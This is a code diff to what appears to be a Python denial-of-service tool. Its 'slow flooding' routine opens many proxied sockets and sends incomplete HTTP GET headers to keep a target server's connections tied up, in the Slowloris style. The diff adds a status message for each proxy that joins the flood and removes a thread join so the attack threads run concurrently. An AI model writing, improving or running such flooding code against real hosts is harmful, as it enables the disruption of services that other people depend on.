@@ -387,6 +387,7 @@ def launch_slow():
                 try:
                     s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-Alive\r\n".encode())
                     socket_list.append(s)
+                    print(f" - {proxy_ip} Join SLOW FLOODING - ")
                 except:
                     s.close()
             except:
@@ -400,7 +401,6 @@ def send_slow():
     for _ in range(thr):
         t = threading.Thread(target=launch_slow, daemon=True)
         t.start()
-        t.join()
     while 1:
         if len(socket_list) > 0:
             for s in socket_list:
@@ -501,6 +501,3 @@ if __name__ == '__main__':
             send_slow()
         else:
             launchThreads()
-        while not KeyboardInterrupt:
-            input()
-        exit()
